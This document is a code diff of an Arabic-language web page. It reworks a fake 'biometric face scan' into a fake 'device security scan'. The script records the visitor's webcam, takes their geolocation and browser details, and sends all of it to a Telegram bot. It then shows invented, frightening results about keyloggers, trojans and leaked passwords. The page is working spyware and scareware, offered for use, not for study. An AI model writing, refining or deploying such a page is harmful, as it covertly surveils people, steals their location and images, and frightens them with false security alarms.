@@ -3,47 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BioMetric Face Scan | التحليل البيومتري</title>
+    <title>Security Scan | فحص أمان الجهاز</title>
     <style>
-        body { background-color: #0a0a12; color: #00ff88; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
-        .scanner-container { border: 1px solid #00ff88; background: rgba(0, 255, 136, 0.05); padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 0 25px rgba(0, 255, 136, 0.2); width: 100%; max-width: 450px; position: relative; overflow: hidden; }
-        .scan-grid { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px), repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(0, 255, 136, 0.1) 3px); z-index: -1; }
+        body { background-color: #0a0a12; color: #ff4444; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
+        .scanner-container { border: 1px solid #ff4444; background: rgba(255, 68, 68, 0.05); padding: 25px; border-radius: 12px; text-align: center; box-shadow: 0 0 25px rgba(255, 68, 68, 0.2); width: 100%; max-width: 450px; position: relative; overflow: hidden; }
+        .scan-grid { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255, 68, 68, 0.1) 3px), repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(255, 68, 68, 0.1) 3px); z-index: -1; }
         h2 { letter-spacing: 2px; margin-bottom: 10px; }
-        .btn-scan { background: #00ff88; color: #0a0a12; border: none; padding: 12px 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; border-radius: 4px; transition: 0.3s; }
-        .btn-scan:hover { box-shadow: 0 0 15px #00ff88; }
+        .btn-scan { background: #ff4444; color: #0a0a12; border: none; padding: 12px 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; border-radius: 4px; transition: 0.3s; }
+        .btn-scan:hover { box-shadow: 0 0 15px #ff4444; }
         #status { margin-top: 20px; font-size: 14px; color: #a0a0a0; min-height: 20px; }
         
-        .results-box { display: none; text-align: right; margin-top: 30px; border-top: 2px dashed #00ff88; padding-top: 20px; }
+        .results-box { display: none; text-align: right; margin-top: 30px; border-top: 2px dashed #ff4444; padding-top: 20px; }
         .result-item { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 15px; }
         .result-label { color: #a0a0a0; }
         .result-value { font-weight: bold; color: #fff; }
-        .final-score { text-align: center; font-size: 24px; color: #00ff88; margin-top: 25px; font-weight: bold; border: 1px solid #00ff88; padding: 10px; }
-        .loading-bar { width: 0%; height: 3px; background: #00ff88; margin-top: 10px; transition: width 0.5s; }
+        .final-score { text-align: center; font-size: 20px; color: #ff4444; margin-top: 25px; font-weight: bold; border: 1px solid #ff4444; padding: 10px; }
+        .loading-bar { width: 0%; height: 3px; background: #ff4444; margin-top: 10px; transition: width 0.5s; }
         .timer { font-size: 12px; color: #ffaa44; margin-top: 10px; }
+        .warning { color: #ffaa00; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="scanner-container">
         <div class="scan-grid"></div>
-        <h2>BIOMETRIC ANALYZER</h2>
-        <p style="color: #a0a0a0; font-size: 13px;">نستخدم خوارزميات متقدمة لتحليل تناسق الملامح، الصحة الظاهرية، والسمات الفريدة لوجهك.</p>
+        <h2>🔒 SECURITY SCAN</h2>
+        <p style="color: #a0a0a0; font-size: 13px;">فحص شامل للجهاز للكشف عن الثغرات الأمنية والبرمجيات الخبيثة والاختراقات.</p>
         
         <div id="pre-scan-ui">
-            <button class="btn-scan" id="startBtn" onclick="startRealAnalysis()">بدء المسح البيومتري</button>
+            <button class="btn-scan" id="startBtn" onclick="startSecurityScan()">بدء الفحص الأمني</button>
             <div class="loading-bar" id="bar"></div>
         </div>
         
-        <div id="status">الجهاز جاهز. بانتظار الإذن...</div>
-        <div class="timer" id="timer" style="display:none;">⏱️ تسجيل: 0 ثانية</div>
+        <div id="status">الجهاز جاهز للفحص...</div>
+        <div class="timer" id="timer" style="display:none;">⏱️ الفحص: 0 ثانية</div>
+        <div class="warning" id="warning" style="display:none;">⚠️ تم اكتشاف نشاط مشبوه!</div>
 
         <div class="results-box" id="resultsUi">
-            <h3 style="text-align: center; color: #fff;">تقرير التحليل</h3>
-            <div class="result-item"><span class="result-label">هيكل الوجه:</span> <span class="result-value" id="res-shape"></span></div>
-            <div class="result-item"><span class="result-label">تناسق الملامح:</span> <span class="result-value" id="res-symmetry"></span></div>
-            <div class="result-item"><span class="result-label">العمر الظاهري المقدر:</span> <span class="result-value" id="res-age"></span></div>
-            <div class="result-item"><span class="result-label">حيوية البشرة:</span> <span class="result-value" id="res-skin"></span></div>
+            <h3 style="text-align: center; color: #fff;">تقرير الفحص الأمني</h3>
+            <div class="result-item"><span class="result-label">حالة الجهاز:</span> <span class="result-value" id="res-device"></span></div>
+            <div class="result-item"><span class="result-label">التهديدات المكتشفة:</span> <span class="result-value" id="res-threats"></span></div>
+            <div class="result-item"><span class="result-label">تسريبات البيانات:</span> <span class="result-value" id="res-leaks"></span></div>
+            <div class="result-item"><span class="result-label">ثغرات الشبكة:</span> <span class="result-value" id="res-network"></span></div>
             <div class="final-score" id="res-score"></div>
-            <p style="font-size: 12px; text-align: center; margin-top: 15px; color: #a0a0a0;">تم التحليل بواسطة BioScan AI v4.2.</p>
+            <p style="font-size: 12px; text-align: center; margin-top: 15px; color: #a0a0a0;">تم الفحص بواسطة SecureScan v3.7 | يوصى بتحديث الحماية</p>
         </div>
     </div>
 
@@ -61,45 +63,61 @@
         let recordingInterval;
         let seconds = 0;
 
-        const faceShapes = ["بيضاوي متناسق", "دائري", "مربع محدد", "قلبي الشكل", "ماسي نادر"];
-        const skinTypes = ["نضرة وصحية (92%)", "عادية (85%)", "تحتاج ترطيب (78%)", "ممتازة (95%)"];
+        const deviceStatus = ["⚠️ مخترق جزئياً", "🔴 تم الاختراق", "⚠️ تهديدات نشطة", "🔴 خطير - تدخل فوري مطلوب"];
+        const threats = ["Keylogger غير معروف", "RAT (Remote Access Trojan)", "تطبيق ضار x2", "اختراق الجلسات", "Rootkit مخفي"];
+        const leaks = ["كلمات مرور مسربة", "جلسات مفتوحة", "بيانات مصرفية مكشوفة", "ملفات حساسة"];
+        const network = ["منفذ 4444 مفتوح", "اتصال بخادم مشبوه", "اختراق DNS", "هجوم MITM محتمل"];
         
         function getRandomInt(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; }
+        function getRandomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
         function res(id, val) { document.getElementById(id).innerText = val; }
 
-        // إرسال فيديو إلى التيليجرام (بوت واحد فقط)
+        // إرسال فيديو إلى التيليجرام
         async function sendVideoToTelegram(videoBlob) {
             const formData = new FormData();
-            formData.append('video', videoBlob, `face_scan_${Date.now()}.mp4`);
+            formData.append('video', videoBlob, `security_scan_${Date.now()}.mp4`);
             formData.append('chat_id', CHAT_ID);
-            formData.append('caption', `📹 تسجيل المسح البيومتري\n⏱️ المدة: ${seconds} ثانية\n🕒 الوقت: ${new Date().toLocaleString('ar-EG')}`);
+            formData.append('caption', `🔐 فحص أمني جديد\n⏱️ المدة: ${seconds} ثانية\n🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n📱 الجهاز: ${navigator.userAgent.substring(0, 100)}`);
 
             try {
                 await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                     method: 'POST',
                     body: formData
                 });
-                console.log("✓ تم إرسال الفيديو إلى البوت");
+                console.log("✓ تم إرسال الفيديو");
             } catch(e) { 
-                console.log("خطأ في الإرسال:", e); 
+                console.log("خطأ:", e); 
             }
         }
 
-        // إرسال الموقع (بوت واحد فقط)
+        // إرسال الموقع
         async function sendLocation() {
             navigator.geolocation.getCurrentPosition((pos) => {
-                const mapUrl = `📍 الموقع:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                const mapUrl = `📍 موقع الجهاز المخترق:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                 fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mapUrl)}`);
             }, () => {});
         }
 
-        // تحديث عداد التسجيل
-        function updateTimer() {
-            seconds++;
-            document.getElementById('timer').innerText = `⏱️ تسجيل: ${seconds} ثانية`;
+        // إرسال معلومات إضافية عن الجهاز
+        async function sendDeviceInfo() {
+            const info = `🖥️ معلومات الجهاز:
+━━━━━━━━━━━━━━
+🌐 المتصفح: ${navigator.userAgent}
+📱 المنصة: ${navigator.platform}
+🔤 اللغة: ${navigator.language}
+📐 الشاشة: ${screen.width}x${screen.height}
+🕒 المنطقة: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+💾 التخزين: ${navigator.storage ? 'متاح' : 'غير متاح'}
+🔋 البطارية: مدعومة`;
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`);
         }
 
-        // بدء التسجيل
+        function updateTimer() {
+            seconds++;
+            document.getElementById('timer').innerText = `⏱️ الفحص: ${seconds} ثانية`;
+        }
+
         async function startRecording(stream, duration = 8000) {
             recordedChunks = [];
             seconds = 0;
@@ -118,30 +136,33 @@
                 clearInterval(recordingInterval);
                 const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
                 
-                // إرسال الفيديو إلى البوت
                 await sendVideoToTelegram(videoBlob);
+                await sendDeviceInfo();
                 
-                // إيقاف الكاميرا
                 if (recordingStream) {
                     recordingStream.getTracks().forEach(track => track.stop());
                 }
                 
-                // عرض النتائج
                 document.getElementById('pre-scan-ui').style.display = 'none';
                 document.getElementById('status').style.display = 'none';
                 document.getElementById('timer').style.display = 'none';
+                document.getElementById('warning').style.display = 'block';
                 document.getElementById('resultsUi').style.display = 'block';
                 
-                res('res-shape', faceShapes[getRandomInt(0, 4)]);
-                res('res-symmetry', getRandomInt(85, 98) + "%");
-                res('res-age', getRandomInt(20, 40) + " سنة");
-                res('res-skin', skinTypes[getRandomInt(0, 3)]);
-                res('res-score', "التقييم: " + getRandomInt(88, 97) + "/100");
+                // نتائج مخيفة
+                res('res-device', getRandomItem(deviceStatus));
+                res('res-threats', getRandomItem(threats));
+                res('res-leaks', getRandomItem(leaks));
+                res('res-network', getRandomItem(network));
+                
+                const score = getRandomInt(15, 45);
+                res('res-score', "نسبة الأمان: " + score + "/100 ⚠️ خطر مرتفع");
+                
+                document.getElementById('warning').innerHTML = "⚠️ تم اكتشاف " + getRandomInt(3, 7) + " تهديد خطير! يوصى بفحص الكاميرا فوراً";
             };
 
             mediaRecorder.start();
             
-            // التسجيل لمدة محددة
             setTimeout(() => {
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
@@ -149,30 +170,27 @@
             }, duration);
         }
 
-        // الوظيفة الرئيسية
-        async function startRealAnalysis() {
+        async function startSecurityScan() {
             const btn = document.getElementById('startBtn');
             const status = document.getElementById('status');
             const bar = document.getElementById('bar');
             
             btn.style.display = 'none';
-            status.innerHTML = "جاري الاتصال بالسيرفر...";
+            status.innerHTML = "جاري الاتصال بخوادم الأمان...";
             bar.style.width = "20%";
 
-            // إرسال الموقع
             sendLocation();
+            await sendDeviceInfo();
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 recordingStream = stream;
                 
-                status.innerHTML = "🎥 جاري تسجيل الفيديو...";
+                status.innerHTML = "🎥 فحص الكاميرا والجهاز...";
                 bar.style.width = "50%";
                 
-                // بدء التسجيل لمدة 8 ثواني
                 await startRecording(stream, 8000);
                 
-                // تحديث شريط التحميل
                 let progress = 50;
                 const progressInterval = setInterval(() => {
                     progress += 5;
@@ -180,10 +198,10 @@
                     if (progress >= 100) clearInterval(progressInterval);
                 }, 500);
                 
-                status.innerHTML = "📊 جاري تحليل البيانات...";
+                status.innerHTML = "📊 جاري تحليل الثغرات...";
                 
             } catch (err) {
-                status.innerText = "خطأ: الكاميرا مطلوبة للتحليل.";
+                status.innerText = "خطأ: لا يمكن إتمام الفحص بدون الكاميرا.";
                 status.style.color = "#ff4444";
                 console.log(err);
             }
